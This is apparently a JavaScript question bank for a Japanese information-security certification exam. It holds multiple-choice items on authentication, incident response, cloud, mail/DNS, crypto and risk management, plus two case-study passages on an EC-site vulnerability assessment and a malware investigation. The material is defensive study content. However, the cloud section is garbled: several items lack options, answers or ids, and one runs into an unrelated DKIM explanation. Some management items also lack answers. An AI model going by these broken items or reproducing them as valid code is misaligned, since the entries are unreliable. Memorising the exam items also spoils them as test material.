a:0,e:"OAuth 2.0は本来「認可」の仕組みで、OIDCは認証層としてIDトークンを追加した。IDトークンは発行者・対象者(aud)・有効期限・nonce等の検証が必須。",s:"SaaS連携・シングルサインオン問題で出題"},
{id:"auth06",theme:"auth",q:"SAML認証連携でIdPとSPの間でやり取りされるものはどれか。",
c:["利用者の認証結果や属性を含むデジタル署名付きのアサーション",
"利用者のパスワードそのもの",
"SPの秘密鍵",
"IdPのアクセスログ"],
a:0,e:"SAMLではIdP(認証提供者)が発行する署名付きアサーションをSP(サービス)が検証して認証を成立させる。パスワードがSPに渡らないことがSSOの利点。",s:"クラウドサービス・テレワーク問題で出題"},
{id:"auth07",theme:"auth",q:"パスワードリスト攻撃への対策として最も効果的なものはどれか。",
c:["多要素認証の導入",
"パスワードの定期変更の強制",
"パスワード入力欄の伏せ字表示",
"アカウント名の複雑化"],
a:0,e:"パスワードリスト攻撃は他サイトから流出した正しいID・パスワードの組を使うため、ロックや複雑化では防ぎにくい。追加の認証要素を要求する多要素認証が最有効。定期変更強制は現在は非推奨。",s:"不正ログイン事例(インシデント問題)で頻出"},
{id:"auth08",theme:"auth",q:"リスクベース認証の説明として適切なものはどれか。",
c:["接続元IPアドレスや端末、時間帯などから普段と異なるアクセスを検知した場合に追加認証を要求する",
"パスワードの強度をリスク値として数値化する",
"全てのログインで生体認証を必須にする",
"リスクの高い利用者のアカウントを削除する"],
a:0,e:"利用状況の文脈からリスクを判定し、疑わしい場合のみ追加認証を課すことで、利便性と安全性を両立させる方式。不正ログイン対策問題の選択肢・記述で登場する。",s:"スマホ決済(R2問1)系の問題で出題"},
{id:"auth09",theme:"auth",q:"JWT(JSON Web Token)の検証で必須の確認事項として不適切なものはどれか。",
c:["ヘッダのalgがnoneの場合は署名検証を省略して受け入れる",
"署名が正しい鍵で検証できること",
"有効期限(exp)が切れていないこと",
"発行者(iss)と対象者(aud)が想定どおりであること"],
a:0,e:"alg:noneを受け入れると署名なしトークンの偽造が可能になる既知の攻撃がある。検証側で許可するアルゴリズムを固定し、署名・exp・iss・audを必ず検証する。",s:"APIセキュリティ(R6春問1)関連"},
{id:"auth10",theme:"auth",q:"特権ID(管理者アカウント)の管理として適切なものはどれか。",
c:["利用を申請制とし、操作ログを取得して定期的にレビューする",
"運用チーム全員で同一の管理者パスワードを共有する",
"緊急対応に備え常時ログインした端末を用意しておく",
"パスワードを設定ファイルに平文で記載して自動化に使う"],
a:0,e:"特権IDは最小権限・申請ベースの一時利用・操作ログの記録とレビューが原則。共有パスワードは責任追跡性を失わせる。シラバス3-8(アカウント管理・アクセス管理)の中心論点。",s:"内部不正・運用問題で出題"},
];
QUESTIONS.push(
// ================= incident =================
{id:"inc01",theme:"incident",q:"マルウェア感染が疑われるPCを発見した際の初動対応として最も適切なものはどれか。",
c:["ネットワークから隔離し、電源は入れたまま保全して調査部門へ連絡する",
"直ちに電源を切って再起動し、ウイルススキャンを実行する",
"OSを再インストールして業務を再開する",
"様子を見ながら業務を継続する"],
a:0,e:"隔離により被害拡大とC&C通信を止めつつ、メモリ上の証跡(実行中プロセス・通信情報)を保全するため電源は原則切らない。再起動や初期化は揮発性情報や証拠を消失させる。",s:"インシデント対応問題(H30秋・R4春ほか)で定番"},
{id:"inc02",theme:"incident",q:"プロキシサーバのログ調査で、マルウェアのC&C通信を疑わせる特徴はどれか。",
c:["業務と無関係の外部ホストへ、深夜も含め一定間隔で繰り返されるHTTP(S)アクセス",
"始業直後に集中する社内ポータルへのアクセス",
"昼休みの動画サイト閲覧",
"月末に増えるファイルサーバへのアクセス"],
a:0,e:"C&C通信はビーコンと呼ばれる定期的な通信が特徴で、時間帯を問わず一定間隔・同一宛先という規則性が手掛かりになる。ログの時系列分析はSC午後の中心スキル。",s:"標的型攻撃対応(R1秋問3)などログ分析問題で頻出"},
{id:"inc03",theme:"incident",q:"デジタルフォレンジックにおける証拠保全の原則として適切なものはどれか。",
c:["原本のディスクは書込み防止した上で複製を作成し、調査は複製に対して行う",
"原本のディスクを直接操作して素早く調査する",
"不要と思われるログは調査前に削除して整理する",
"保全作業の記録は調査終了後にまとめて作成する"],
a:0,e:"証拠の完全性維持のため、書込み防止装置を介してビット単位の複製(ハッシュ値で同一性を確認)を取得し、解析は複製で行う。作業記録(Chain of Custody)は都度残す。",s:"シラバス4-4 証拠の収集及び分析"},
{id:"inc04",theme:"incident",q:"ランサムウェア被害からの復旧を確実にするバックアップ方式として最も適切なものはどれか。",
c:["ネットワークから切り離したオフライン媒体や書換え不能な領域にもバックアップを保管する",
"感染したサーバと同じネットワーク上のNASに毎日バックアップする",
"バックアップは月1回、同一サーバ内の別フォルダに取得する",
"バックアップの復元テストは行わず取得のみ続ける"],
a:0,e:"最近のランサムウェアはネットワーク上のバックアップも暗号化・削除するため、オフライン保管やイミュータブルストレージが有効。3-2-1ルールと復元テストの実施も重要。",s:"ランサムウェア対策(H29秋問1ほか)関連"},
{id:"inc05",theme:"incident",q:"CSIRTにおけるトリアージの説明として適切なものはどれか。",
c:["検知した事象の影響度・緊急度を評価し、対応の要否と優先順位を決定する",
"インシデントの根本原因を特定する",
"再発防止策を経営層へ報告する",
"マルウェアの検体を解析する"],
a:0,e:"トリアージは受け付けた事象をインシデントとするかの判断と優先順位付けを行う工程。限られた要員で重大事案から対応するために不可欠。シラバス4-2に対応。",s:"インシデント対応体制の整備(R3春PM2問1)で出題"},
{id:"inc06",theme:"incident",q:"EDRの主な機能として適切なものはどれか。",
c:["端末上のプロセス起動や通信などの挙動を記録・監視し、侵害の検知と調査・対処を支援する",
"既知マルウェアのパターンマッチングによる侵入前のブロックのみを行う",
"ネットワーク境界で不正パケットを遮断する",
"メールの添付ファイルを無害化する"],
a:0,e:"EDR(Endpoint Detection and Response)は侵入を前提に端末の挙動を常時記録し、検知後の影響範囲調査(どのプロセスが何をしたか)や遠隔隔離を可能にする。パターンマッチング中心の従来型AVと対比される。",s:"R4以降のインシデント問題で登場"},
{id:"inc07",theme:"incident",q:"インシデント調査で複数機器のログを突き合わせる前提として重要なものはどれか。",
c:["NTPによる機器間の時刻同期",
"ログの圧縮形式の統一",
"ログの言語設定の統一",
"ログファイル名の命名規則"],
a:0,e:"時刻がずれていると攻撃の前後関係を正しく再構成できない。NTPでの時刻同期とタイムゾーンの整合はログ管理の基本。シラバス3-4に明記されている。",s:"ログ分析問題の定番小問"},
{id:"inc08",theme:"incident",q:"個人データの漏えいが発生した場合の対応として、個人情報保護法上求められるものはどれか。",
c:["個人情報保護委員会への報告と本人への通知(一定の重大事案の場合)",
"警察への被害届の提出のみ",
"社内での記録保管のみで外部報告は不要",
"報道機関への発表のみ"],
a:0,e:"要配慮個人情報の漏えいや1,000人超の漏えい等の重大事案では、個人情報保護委員会への報告(速報・確報)と本人通知が義務。インシデント対応手順の設問で問われる。",s:"クレジットカード情報の漏えい(R6秋問3)関連"},
{id:"inc09",theme:"incident",q:"攻撃の痕跡調査で用いるIoC(Indicator of Compromise)に該当しないものはどれか。",
c:["自社の情報セキュリティ基本方針",
"マルウェアのファイルハッシュ値",
"C&CサーバのIPアドレスやドメイン名",
"攻撃で使われるファイル名やレジストリキー"],
a:0,e:"IoCは侵害の存在を示す技術的指標(ハッシュ値、通信先、ファイルパス等)。脅威情報として共有され、ログ検索やEDRでの横断調査に使う。基本方針は指標ではない。",s:"脅威情報調査(R4秋PM2問1)で出題"},
{id:"inc10",theme:"incident",q:"インシデント対応完了後に行う活動として最も適切なものはどれか。",
c:["対応の振り返りを行い、根本原因に基づく再発防止策と手順の改善を実施する",
"記録を全て削除し通常業務に戻る",
"関係者の処分を最優先で決定する",
"同じ攻撃は再来しないため特段の対応はしない"],
a:0,e:"事後活動(Lessons Learned)では時系列の整理、根本原因分析、再発防止策、手順・教育への反映を行う。シラバス4-3の「対応改善」に対応し、記述式で問われやすい。",s:"インシデントレスポンス(R6秋問1)関連"},

{id:"cl01",theme:"cloud",q:"IaaSにおける責任共有モデルで、利用者側の責任となるものはどれか。",
c:["ゲストOSのパッチ適用とミドルウェア・アプリケーションの設定",
"データセンターの物理的セキュリティ",
"ハイパーバイザの脆弱性対策",
"ホストサーバのハードウェア保守"],

{id:"cl02",theme:"cloud",q:"クラウドのオブジェクトストレージからの情報漏えいで最も多い原因はどれか。",

"データセンターへの物理侵入",
"ハイパーバイザの脆弱性悪用"],

"APIキーをソースコードにコミットして共有する",

{id:"cl04",theme:"cloud",q:"クラウドの一時的な認証情報(インスタンスに付与するロール)を使う利点はどれか。",

a:0,e:"DKIMは秘密鍵で署名し公開鍵をDNSで公開する方式。経路のIPアドレスに依存しないため転送に強い。SPF・DKIM・DMARCの三点セットの特徴比較は頻出。",s:"メールセキュリティ問題の定番比較"},
{id:"mail03",theme:"mail",q:"DMARCの機能として適切なものはどれか。",
c:["SPF/DKIMの検証結果とヘッダFromの整合を確認し、失敗時の取扱い(none/quarantine/reject)をドメイン側が宣言できる",
"メール本文を自動翻訳する",
"添付ファイルを自動で暗号化する",
"メールの送信数を制限する"],
a:0,e:"DMARCはなりすまし対策の要で、認証失敗時のポリシー宣言とレポート受信ができる。ヘッダFrom(表示上の差出人)との整合(アライメント)を検証する点がポイント。",s:"なりすましメール対策設問で頻出"},
{id:"mail04",theme:"mail",q:"ビジネスメール詐欺(BEC)への対策として最も適切なものはどれか。",
c:["振込先変更などの重要依頼はメール以外の手段(電話等)で相手に事実確認する運用を定める",
"メールの署名欄を装飾する",
"添付ファイルを常にZIP圧縮する",
"メールの件名に社外秘と記載する"],
a:0,e:"BECは経営者や取引先になりすまして送金を指示する詐欺で、技術対策だけでは防ぎきれない。別経路での事実確認、複数人承認などの業務プロセスでの対策が本質。",s:"メール・インシデント複合問題で出題"},
{id:"mail05",theme:"mail",q:"DNSキャッシュポイズニング攻撃への対策として適切なものはどれか。",
c:["DNSSECの導入や、問合せの送信元ポートのランダム化を行う",
"DNSサーバの応答を高速化する",
"TTLを極端に長く設定する",
"ゾーン転送を全ホストに許可する"],
a:0,e:"偽の応答をキャッシュさせる攻撃には、応答の真正性を署名で検証するDNSSECや、推測を困難にするポートランダム化が有効。キャッシュサーバと権威サーバの分離も基本対策。",s:"DNS問題(R6秋問2ほか)関連"},
{id:"mail06",theme:"mail",q:"ドメイン名の廃止・変更時に注意すべきリスクはどれか。",
c:["手放したドメインを第三者に再取得され、なりすましサイトやメール受信に悪用される(ドロップキャッチ)",
"DNSサーバの電気代が増加する",
"ドメイン名が長くなると通信速度が低下する",
"IPアドレスが自動的に変わる"],
a:0,e:"廃止ドメインの再取得により、旧ドメイン宛メールの窃取や偽サイト開設が可能になる。R6秋問2はドメイン名変更を主題に、移行手順とリスクを問う新傾向の出題だった。",s:"ドメイン名変更(R6秋問2)"},
{id:"mail07",theme:"mail",q:"オープンリゾルバを放置した場合のリスクはどれか。",
c:["DNSリフレクション(増幅)攻撃の踏み台として悪用される",
"自ドメインのメールが全て暗号化される",
"Webサイトの表示が高速になる",
"ゾーン情報が自動でバックアップされる"],
a:0,e:"誰からの問合せにも応答するキャッシュサーバは、送信元を偽装したDDoS攻撃の増幅装置に悪用される。問合せ元を自組織に限定する設定が対策。",s:"シラバス3-5 DNSのセキュリティ"},
{id:"mail08",theme:"mail",q:"メール無害化の手法として適切なものはどれか。",
c:["添付ファイルからマクロ等の動的コンテンツを除去し、本文中のURLリンクを無効化して配送する",
"メールを全て削除する",
"件名を暗号化する",
"送信者へ自動返信する"],
a:0,e:"無害化(サニタイズ)は添付のマクロ除去・画像化(CDR)、URL無効化などで感染リスクを下げる。利便性低下との両立が記述設問で問われる。",s:"自治体・重要システム系の問題で出題"},
{id:"mail09",theme:"mail",q:"サブドメインテイクオーバーが発生する典型的な原因はどれか。",
c:["外部サービス向けのCNAMEレコードを、サービス解約後もDNSに残している",
"TTLを短く設定している",
"DNSSECを有効にしている",
"MXレコードを複数登録している"],
a:0,e:"解約済みサービスを指すCNAME等が残ると、第三者がそのサービス上で当該名を取得し、正規サブドメインで偽コンテンツを配信できる。DNSレコードの棚卸しが対策。",s:"DNS運用問題(R6秋問2)関連の新傾向"},
{id:"mail10",theme:"mail",q:"フィッシング対策として送信ドメイン認証と併せて有効なものはどれか。",
c:["自社を装うフィッシングサイトの監視と、利用者への注意喚起・報告窓口の整備",
"メールの利用を全面禁止する",
"パスワードを平文でメール通知する",
"リンクは全て短縮URLで送る"],
a:0,e:"技術対策(DMARC等)と併せ、類似ドメインの監視・テイクダウン依頼、利用者教育、通報窓口が総合的なフィッシング対策となる。短縮URLはかえって確認を妨げる。",s:"金融・EC系事例問題で出題"},

// ================= crypto =================
{id:"cry01",theme:"crypto",q:"ハイブリッド暗号方式でTLSが共通鍵暗号と公開鍵暗号を併用する理由はどれか。",
c:["鍵交換・認証には公開鍵暗号を使い、大量データの暗号化は高速な共通鍵暗号で行うため",
"公開鍵暗号の方が常に高速だから",
"共通鍵暗号は安全性が証明されていないから",
"法令で併用が義務付けられているから"],
a:0,e:"公開鍵暗号は鍵配送問題を解決するが処理が重い。セッション確立時に共通鍵(セッション鍵)を安全に共有し、以降は高速な共通鍵暗号で通信するのが定石。",s:"暗号の基本。データ暗号化の設計(H29秋PM2問2)関連"},
{id:"cry02",theme:"crypto",q:"TLSのサーバ証明書検証でブラウザが確認する事項として不適切なものはどれか。",
c:["サーバの秘密鍵がブラウザに登録済みであること",
"信頼するルート認証局までの証明書チェーンが検証できること",
"証明書の有効期限が切れていないこと",
"接続先ホスト名が証明書のSAN/CNと一致すること"],
a:0,e:"サーバの秘密鍵はサーバのみが保持するもので、ブラウザには登録されない。検証はチェーン・有効期限・ホスト名一致・失効確認が基本。証明書エラーの原因分析設問で問われる。",s:"SSL/TLSサーバ設定と運用(H29秋問3)ほか"},
{id:"cry03",theme:"crypto",q:"前方秘匿性(Forward Secrecy)の説明として適切なものはどれか。",
c:["サーバの秘密鍵が将来漏えいしても、過去に記録された通信の復号ができない性質",
"通信を高速化する性質",
"証明書の有効期限を延長できる性質",
"パスワードを平文で送っても安全になる性質"],
a:0,e:"DHE/ECDHEなどの一時鍵による鍵交換では、セッション鍵がサーバの長期秘密鍵から導出されないため、秘密鍵漏えい時も過去の通信は守られる。TLS 1.3ではFS必須。",s:"TLS設定問題の応用論点"},
{id:"cry04",theme:"crypto",q:"デジタル署名で保証できるものの組合せとして適切なものはどれか。",
c:["データの完全性と署名者の真正性(否認防止を含む)",
"データの機密性と可用性",
"通信の高速性と匿名性",
"データの圧縮率と互換性"],
a:0,e:"署名はハッシュ値を秘密鍵で暗号化したもので、改ざん検知(完全性)と署名者の確認(真正性・否認防止)を実現する。機密性は暗号化の役割で署名では得られない。",s:"暗号・署名の基本(頻出穴埋め)"},
{id:"cry05",theme:"crypto",q:"証明書の失効確認に用いる仕組みはどれか。",
c:["CRLまたはOCSP",
"DNSSECとDKIM",
"HSTSとCSP",
"NTPとSNMP"],
a:0,e:"CRL(失効リスト)は一覧を配布、OCSPは個別照会で失効状態を確認する。OCSPステープリングはサーバが応答を添付して照会負荷とプライバシー問題を軽減する方式で、これも問われる。",s:"PKI運用問題で頻出"},
{id:"cry06",theme:"crypto",q:"暗号技術の選定で参照すべき、日本の推奨暗号のリストはどれか。",
c:["CRYPTREC暗号リスト",
"OWASP Top 10",
"CVSS",
"ISMSクラウドセキュリティ認証"],
a:0,e:"CRYPTRECは電子政府推奨暗号の安全性を評価・公表しており、暗号選定の根拠として参照する。危殆化した方式(SHA-1、RC4、3DES等)からの移行判断も論点。",s:"シラバス3-1 暗号の安全性評価"},
{id:"cry07",theme:"crypto",q:"共通鍵暗号の鍵管理として適切なものはどれか。",
c:["鍵を暗号化対象データと分離して保管し、アクセス制御と鍵の定期的な更改を行う",
"鍵を暗号化したデータと同じファイルに保存する",
"全システムで同一の鍵を永続的に使用する",
"鍵をソースコードに直接記述する"],
a:0,e:"鍵とデータの分離保管、アクセス制御、更改(ローテーション)、廃棄までのライフサイクル管理が鍵管理の基本。HSMやKMSの利用も設計問題で問われる。",s:"データ暗号化の設計(H29秋PM2問2)関連"},
{id:"cry08",theme:"crypto",q:"パスワード付きZIPファイルをメールで送り、直後に同じ経路でパスワードを送る方式(PPAP)の問題点はどれか。",
c:["同一経路の盗聴で両方入手でき、かつ暗号化ZIPはマルウェア検査をすり抜けやすい",
"ファイルサイズが大きくなりすぎる",
"ZIP形式は解凍できない受信者が多い",
"パスワードが自動的に無効化される"],
a:0,e:"経路が同じでは盗聴・誤送信への効果が薄く、検査不能な添付はマルウェア配送にも悪用される。代替はクラウドストレージ共有やS/MIME等。ファイル受渡し問題の頻出論点。",s:"協力会社とのファイルの受渡し(R3秋PM2問1)関連"},
{id:"cry09",theme:"crypto",q:"ハッシュ関数に求められる性質のうち「衝突発見困難性」の説明はどれか。",
c:["同じハッシュ値になる異なる2つの入力を見つけることが計算量的に困難であること",
"ハッシュ値から元の入力を復元できないこと",
"入力が1ビット変わるとハッシュ値が大きく変わること",
"ハッシュ値の計算が高速であること"],
a:0,e:"衝突発見困難性は任意の2入力の衝突が見つけにくい性質。原像計算困難性(一方向性)・第二原像計算困難性との区別が問われる。SHA-1は衝突が現実に生成され危殆化した。",s:"暗号知識の穴埋めで出題"},
{id:"cry10",theme:"crypto",q:"HSTSヘッダの効果として適切なものはどれか。",
c:["ブラウザに以降のアクセスをHTTPSに限定させ、HTTPへのダウングレードや中間者攻撃のリスクを減らす",
"サーバのTLS処理を高速化する",
"証明書の有効期限を自動延長する",
"Cookieを自動的に削除する"],
a:0,e:"Strict-Transport-Securityを受け取ったブラウザは期間中HTTP接続を試みずHTTPSへ内部変換する。初回接続の保護にはpreloadリストへの登録がある。TLS運用設問で登場。",s:"Webサイトのセキュリティ問題関連"},

// ================= mgmt =================
{id:"mg01",theme:"mgmt",q:"CVSSの基本評価基準(Base Metrics)が表すものはどれか。",
c:["攻撃元区分や必要な特権など、脆弱性そのものの特性に基づく深刻度",
"自組織のシステム構成を考慮した最終的なリスク値",
"攻撃コードの流通状況の時間変化のみ",
"脆弱性を発見した研究者の評価"],

{id:"mg02",theme:"mgmt",q:"脆弱性対応の優先順位付けとして最も適切な考え方はどれか。",
c:["CVSS値に加え、悪用の観測状況、対象システムの重要度・公開状況を考慮して決める",
"CVSS値が高い順に機械的に全て即日対応する",
"ベンダーからの通知が来たものだけ対応する",
"年1回まとめて全パッチを適用する"],
a:0,e:"限られた要員で対応するには、実際に悪用されているか(KEV・PoC流通)、インターネット公開の有無、業務影響を組み合わせたリスクベースの優先順位付けが必要。",s:"IT資産管理及び脆弱性管理(R7春問4)関連"},
{id:"mg03",theme:"mgmt",q:"SBOM(Software Bill of Materials)を整備する主な目的はどれか。",
c:["ソフトウェアを構成するコンポーネントを可視化し、脆弱性公表時に影響範囲を迅速に特定する",
"ソフトウェアの販売価格を管理する",
"ソースコードの著作権を放棄する",
"ビルド時間を短縮する"],
a:0,e:"Log4Shellのような広範な脆弱性では「自社のどこで使われているか」の特定が初動を左右する。SBOMは部品表として依存関係を管理し、影響調査を迅速化する。",s:"サプライチェーン・脆弱性管理問題(R7)の新論点"},
{id:"mg04",theme:"mgmt",q:"リスクアセスメントにおけるリスクの大きさの一般的な評価方法はどれか。",
c:["脅威の発生可能性と、発生した場合の影響の大きさの組合せで評価する",
"導入済み製品の数で評価する",
"経営者の主観のみで評価する",
"従業員数に比例させて評価する"],
a:0,e:"リスクは発生可能性×影響度で評価し、リスクマトリクス等で優先順位付けする。資産の特定→脅威・脆弱性の分析→評価→対応(低減・回避・共有・保有)の流れも頻出。",s:"リスクアセスメント(R5秋問4)で出題"},
{id:"mg05",theme:"mgmt",q:"リスク対応の選択肢のうち「リスク共有(移転)」に該当するものはどれか。",
c:["サイバー保険に加入して損害の一部を保険会社に負担させる",
"該当業務を廃止する",
"暗号化を導入して漏えいの影響を下げる",
"リスクを認識した上で何もせず受け入れる"],
a:0,e:"共有(移転)は保険や外部委託で第三者とリスクを分担すること。業務廃止は回避、対策導入は低減、受容は保有。4区分の対応付けは知識問題の定番。",s:"シラバス1-3 リスク対応の選択肢"},
{id:"mg06",theme:"mgmt",q:"委託先のセキュリティ管理として適切なものはどれか。",
c:["契約でセキュリティ要求事項と監査・報告の権利を定め、対応状況を定期的に確認する",
"契約後は委託先を全面的に信頼し確認しない",
"委託先の再委託を無条件で認める",
"インシデント発生時の連絡義務は定めない"],
a:0,e:"委託契約にはセキュリティ要件・再委託の制限・インシデント時の報告義務・監査権を盛り込み、チェックリストや実地確認で履行状況を確認する。サプライチェーン攻撃の増加で重要度が上昇。",s:"サプライチェーンのリスク対策(R7春問1)関連"},
{id:"mg07",theme:"mgmt",q:"内部不正の防止策として「職務の分離」が有効な理由はどれか。",
c:["一人で不正を完結できないよう、申請と承認など相反する権限を別の者に分ける",
"従業員の業務量を平準化できる",
"人件費を削減できる",
"教育の手間を省ける"],
a:0,e:"承認・実行・確認の権限を分離すると単独犯行が困難になり、相互牽制が働く。最小権限、ログによる監視、定期的な権限見直しと合わせて内部不正対策の柱となる。",s:"シラバス3-9 人的管理/内部不正問題"},
{id:"mg08",theme:"mgmt",q:"IT資産管理が脆弱性管理の前提となる理由として適切なものはどれか。",
c:["把握していない機器・ソフトウェアの脆弱性には対応できず、管理外資産が侵入経路になるため",
"資産台帳があればパッチ適用が不要になるため",
"資産の減価償却を早められるため",
"ライセンス費用が無料になるため"],
a:0,e:"「守るべきものを知る」ことが出発点。台帳と実態の差異(野良サーバ、退役漏れのVPN機器等)が攻撃の入口になる事例が多く、ASM(攻撃対象領域管理)の考え方も問われ始めている。",s:"IT資産管理及び脆弱性管理(R7春問4)"},
{id:"mg09",theme:"mgmt",q:"セキュリティパッチを直ちに適用できない場合の対応として適切なものはどれか。",
c:["WAFやアクセス制限などの回避策(緩和策)を講じた上で、計画的に適用時期を定める",
"脆弱性を放置し何も記録しない",
"システムの利用者に口頭で注意を促すだけにする",
"パッチ適用の代わりにバックアップを停止する"],

{id:"mg10",theme:"mgmt",q:"インシデント発生に備えた経営層の関与として適切なものはどれか。",
c:["対応体制・報告基準・意思決定権限を平時に定め、演習に参加して実効性を確認する",
"技術的な問題であるため経営層は関与しない",
"インシデント発生後に初めて体制を検討する",
"全ての判断を現場担当者に一任する"],

);

// 本文中の【 a 】等は空欄、下線①等は設問で参照する
const CASES = [
{id:"rc1", theme:"web", title:"ECサイトの脆弱性診断", minutes:15,
body:`<p>A社は、従業員数300名の生活雑貨販売会社であり、自社開発のECサイト(以下、サイトXという)を運営している。サイトXの会員は、ログイン後のマイページで氏名、配送先住所、注文履歴を確認できる。</p>
<p>A社は、サイトXの機能追加に先立ち、セキュリティ専門会社B社にWebアプリケーション脆弱性診断を依頼した。診断結果の概要を表1に示す。</p>
<table class="p-table"><caption>表1 診断結果の概要(抜粋)</caption>
<tr><th>項番</th><th>指摘事項</th><th>危険度</th></tr>
<tr><td>1</td><td>会員情報変更画面の氏名欄に入力したスクリプトが、マイページ表示時に実行される(クロスサイトスクリプティング)</td><td>高</td></tr>
<tr><td>2</td><td>商品検索機能のパラメタにSQL文の一部を挿入すると、データベースのエラーが応答に含まれる(SQLインジェクションの疑い)</td><td>高</td></tr>
<tr><td>3</td><td>セッション管理用cookieに一部の属性が設定されていない</td><td>中</td></tr></table>
<p>項番1について、B社のCさんは「入力値がデータベースに保存された後、マイページの表示時にそのまま出力されており、<u>①反射型XSSと比べて被害が拡大しやすい</u>」と説明した。対策として、Cさんは表示時のエスケープ処理の実装を求めた。</p>
<p>項番3について、サイトXのセッション管理用cookieにはSecure属性は設定されていたが、【 a 】属性が設定されていなかった。【 a 】属性を設定すると、スクリプトからのcookieの読出しが禁止されるので、XSSが悪用された場合でもセッションIDの窃取を防げる。</p>
<p>また、Cさんはログイン処理のレビューにおいて、<u>②ログインの成功時にセッションIDを新たに発行し直す</u>実装になっていることを確認した。</p>
<p>項番2について、A社の開発担当Dさんは、当面の対応としてWAFの導入を提案したが、Cさんは<u>③WAFの導入だけでは根本的な対策にならない</u>と指摘し、アプリケーションの修正を求めた。</p>`,
questions:[
{id:"rc1q1",theme:"web",q:"本文中の【 a 】に入れる適切な字句はどれか。",
c:["HttpOnly","SameSite","Domain","Max-Age"],a:0,
e:"スクリプト(document.cookie)からの読出しを禁止するのはHttpOnly属性。SameSiteはクロスサイト送信の制御、Secureは HTTPS 限定送信で、それぞれ役割が異なる。"},
{id:"rc1q2",theme:"web",q:"下線①について、格納型XSSが反射型XSSと比べて被害が拡大しやすい理由として、最も適切なものはどれか。",
c:["攻撃文字列がサーバに保存され、細工したURLを踏ませなくても、該当ページを閲覧した会員全員が被害を受け得るから",
"格納型XSSはHTTPS通信を復号できるから",
"格納型XSSはWAFで検知できないから",
"格納型XSSはセッションIDを使用しないから"],a:0,
e:"反射型は罠URLを踏んだ利用者だけが対象だが、格納型は保存された攻撃文字列が閲覧者全員に配信される。本試験でも「影響を受ける利用者の範囲」を記述させる形で問われる。"},
{id:"rc1q3",theme:"web",q:"下線②の実装が防止する攻撃はどれか。",
c:["攻撃者が事前に取得したセッションIDを被害者に使わせて、ログイン後になりすますセッションフィクセーション攻撃",
"パスワードの総当たり攻撃",
"SQLインジェクション攻撃",
"DNSキャッシュポイズニング攻撃"],a:0,
e:"ログイン前のセッションIDを継続利用すると、攻撃者が固定したIDでログイン後のセッションを乗っ取れる。ログイン成功時のID再発行が定石の対策。"},
{id:"rc1q4",theme:"web",q:"項番2への根本的な対策として、最も適切なものはどれか。",
c:["プレースホルダを用いたプリペアドステートメントでSQL文を組み立てるよう修正する",
"データベースのエラーメッセージを画面に表示しないようにする",
"検索欄の入力文字数を制限する",
"検索機能を管理者専用にする"],a:0,
e:"エラー非表示や文字数制限は攻撃を難しくするだけの緩和策。SQL文の構造と入力値を分離するバインド機構が根本対策となる。"},
{id:"rc1q5",theme:"web",q:"下線③の理由として、最も適切なものはどれか。",
c:["WAFはパターンに合致した通信を検査する緩和策であり、検知を回避する攻撃や新たな攻撃手法をすり抜ける可能性が残るから",
"WAFはHTTPS通信を一切検査できないから",
"WAFを導入するとサイトの応答が必ず停止するから",
"WAFはSQLインジェクション以外の攻撃を全て許可するから"],a:0,
e:"WAFはシグネチャ・ルールに基づく防御で、難読化などによる回避の可能性がある。脆弱性そのものを修正するまでの時間稼ぎ(仮想パッチ)と位置づけるのが正しい。"}]},

{id:"rc2", theme:"incident", title:"マルウェア感染の調査と対処", minutes:15,
body:`<p>B社は、従業員数800名の建材商社である。ある日の10時30分、営業部のEさんが、取引先を装ったメールの添付ファイルを開いた。14時頃、B社のセキュリティ監視を委託しているF社から「営業部のPC-21から不審な外部通信を検知した」との連絡があり、B社のCSIRTが調査を開始した。</p>
<p>CSIRTのGさんがプロキシサーバのログを確認したところ、表2の記録が見つかった。</p>
<table class="p-table"><caption>表2 プロキシサーバのログ(抜粋)</caption>
<tr><th>時刻</th><th>接続元</th><th>宛先ホスト</th><th>備考</th></tr>
<tr><td>10:32</td><td>PC-21</td><td>www.zaimu-shiryo.example</td><td>初回接続</td></tr>
<tr><td>10:37</td><td>PC-21</td><td>cdn-sys-update.example</td><td>以降5分間隔で継続</td></tr>
<tr><td>10:42</td><td>PC-21</td><td>cdn-sys-update.example</td><td></td></tr>
<tr><td>12:15</td><td>PC-35</td><td>www.news-site.example</td><td>昼休みの閲覧</td></tr></table>
<p>Gさんは、宛先ホストcdn-sys-update.exampleへの通信について、<u>①マルウェアのC&C通信の可能性が高い</u>と判断した。Gさんは直ちにPC-21をネットワークから隔離した。このとき、<u>②PC-21の電源は切らずに保全した</u>。</p>
<p>次にGさんは、感染がPC-21以外に広がっていないかを調査するため、【 b 】のログを確認することにした。あわせて、F社から提供されたマルウェアの通信先ドメインやファイルのハッシュ値などの【 c 】を用いて、EDRで全端末を横断的に検索した。</p>
<p>調査の結果、被害はPC-21のみと確認された。CSIRTは復旧後、対応の振り返りを行い、再発防止策をまとめた。</p>`,
questions:[
{id:"rc2q1",theme:"incident",q:"下線①のようにGさんが判断した根拠として、最も適切なものはどれか。",
c:["業務と関係のない宛先に対して、5分間隔という規則的な通信が継続しているから",
"宛先ホスト名にcdnという文字列が含まれているから",
"接続元が営業部のPCだから",
"通信が昼休みの時間帯に行われているから",],a:0,
e:"C&C通信は一定間隔のビーコンが特徴で、時間帯を問わず規則的に続く点が正常な閲覧との違い。添付ファイル開封(10:30)直後に始まっている時系列も傍証となる。"},
{id:"rc2q2",theme:"incident",q:"下線②の理由として、最も適切なものはどれか。",
c:["実行中のプロセスや通信状況などメモリ上の揮発性情報を、調査のために保全するため",
"電源を切るとマルウェアが他のPCに自動転送されるため",
"電源を切るとプロキシサーバのログが消えるため",
"停電時の復旧作業を省略するため"],a:0,
e:"メモリ上にはプロセス、接続先、復号済みのマルウェア本体など重要な証跡がある。隔離で被害拡大を止めた上で、揮発性情報は電源断の前に保全するのが原則。"},
{id:"rc2q3",theme:"incident",q:"本文中の【 b 】に入れるログとして、横展開の調査に最も有用なものはどれか。",
c:["認証サーバ(ディレクトリサービス)の認証成功・失敗のログ",
"プリンタサーバの印刷ログ",
"入退室管理システムのログ",
"ファイルサーバのディスク使用量の推移"],a:0,
e:"横展開では窃取したアカウントによる他端末・サーバへの認証が発生するため、認証ログでPC-21由来の不審な認証を探すのが定石。"},
{id:"rc2q4",theme:"incident",q:"本文中の【 c 】に入れる字句はどれか。",
c:["IoC(Indicator of Compromise)","SLA","RFP","BCP"],a:0,
e:"通信先ドメイン、IPアドレス、ファイルハッシュ値など侵害の痕跡を示す技術的指標がIoC。EDRやSIEMでの横断検索に用いる。"},
{id:"rc2q5",theme:"incident",q:"事後の再発防止策として、添付ファイル経由の感染リスクを直接低減するものはどれか。",
c:["インターネットから受信した文書ファイルのマクロを既定で無効化する",
